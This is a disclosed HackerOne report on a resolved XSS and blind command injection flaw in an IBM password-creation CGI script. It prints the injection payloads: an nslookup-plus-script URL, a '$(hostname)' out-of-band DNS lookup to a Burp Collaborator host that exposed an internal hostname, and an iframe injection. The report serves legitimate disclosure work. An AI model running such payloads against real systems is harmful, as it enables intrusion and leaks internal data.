---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/os-command-injection
  - env/web
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2022-02-04
submitted: 2018-09-16T14:35:35.912Z
bounty_usd: null
votes: 42
cve: []
program: "[[programs/ibm|IBM]]"
reporter: "vermithor-ke"
source: "https://hackerone.com/reports/410334"
title: "Reflected XSS and Blind out of band command injection at subdomain dstuid-ww.dst.ibm.com"
---
# Reflected XSS and Blind out of band command injection at subdomain dstuid-ww.dst.ibm.com

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 42 | **Program:** IBM | **Disclosed:** 2022-02-04

- Report: [https://hackerone.com/reports/410334](https://hackerone.com/reports/410334)
- CWE: OS Command Injection
- Submitted: 2018-09-16T14:35:35.912Z

## Report summary

The discovered XSS and Blind OS based injection issues due to the incorrect handling of the [X] characters were reported to IBM, analyzed and have been remediated. Thank you to our external researcher, smokin-ac3z.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I found an XSS and Blind OS based injection issue due to the incorrect handling of the  characters in THE EMAIL  get& post parameters.  A <script> injected and a sleep command succesfully executed, the following link works as a PoC that alerts the string in the script:
I reproduced the same on Firefox and IE and Microsoft Edge
XSS POC URL:-
GET /cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit HTTP/1.1
Host: dstuid-ww.dst.ibm.com


https://dstuid-ww.dst.ibm.com/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submi

OSCOMMAND INJECT

POST /cgi-bin/PasswordCreate.pl HTTP/1.1
Host: dstuid-ww.dst.ibm.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Referer: https://dstuid-ww.dst.ibm.com/PasswordCreate.html
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

email=-------------------------&ibm-submit=Submit

For the blind os command injection i used three variables:_
1. A random email address (To bench mark the normal responce time
2.  Ping requests  of 10 and 20 seconds 

The reply from the server prooved that the  time-delay inference existed.

See attached videos and images for POC

## Impact

This allows an attacker to inject custom Javascript codes that can be used to steal information from  user base and lure them to malicious websites on the internet on behalf of IBM website.

## Timeline

- **2018-09-16** @vermithor-ke: I also discovered Frame injection ( which i injected my websitefor poc) on the same vulnerable parameter. See attached video and image Poc.
The frame is:-  <iframe src="https://smokiancez.co.ke/?"></iframe>
- **Report Filed**
- **2018-09-17** @dukefleed: Hello @smokin-ac3z,

Thank you for the report. We are currently reviewing this and will get in touch with you once our review is complete.

Kind regards,
@dukefleed
- **2018-09-20** @redstapler: Thank you for your submission of material on a potential vulnerability.  We are reviewing your report to determine its validity, and we will follow up regarding our analysis.

By submitting a vulnerability report to IBM, you grant to IBM Corporation, its subsidiaries and its affiliates, a perpetual, irrevocable, no charge license to all intellectual property rights licensable by you in or related to the use of this material. Also, it is important that you notify us if any of this material is not your own work or is covered by the intellectual property rights of others. Not notifying us means that you've represented that no third party intellectual property rights are involved.
- **2018-09-21** @vermithor-ke: @ibmvm1 just to confirm the existance of os command injection i did a burpsuite collaborator DNS nslookup call and confirmed the same. 
First i used :- 
5hndnlh2doy9pao2yq34djzh58byzn.burpcollaborator.net  and 
 RESPONSE
The Collaborator server received a DNS lookup of type CNAME for the domain name 5hndnlh2doy9pao2yq34djzh58byzn.burpcollaborator.net

Then I tried calling up the hostname as below:-

$(hostname).5hndnlh2doy9pao2yq34djzh58byzn.burpcollaborator.net
RESPONSE
lexbyz0105.ecloud.edst.ibm.com.5hndnlh2doy9pao2yq34djzh58byzn.burpcollaborator.net

POC ATTACHED
- **Report Triaged**
- **2018-09-27** @redstapler: @smokin-ac3z Would you please verify the reported vulnerability has been remediated?
- **2018-09-29** @vermithor-ke: @redstapler I have verified. Fixed
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2022-02-05** @vermithor-ke: @pink-ocean thank you for agreeing to disclose. Ic appreciate if you add my handle to the summary.
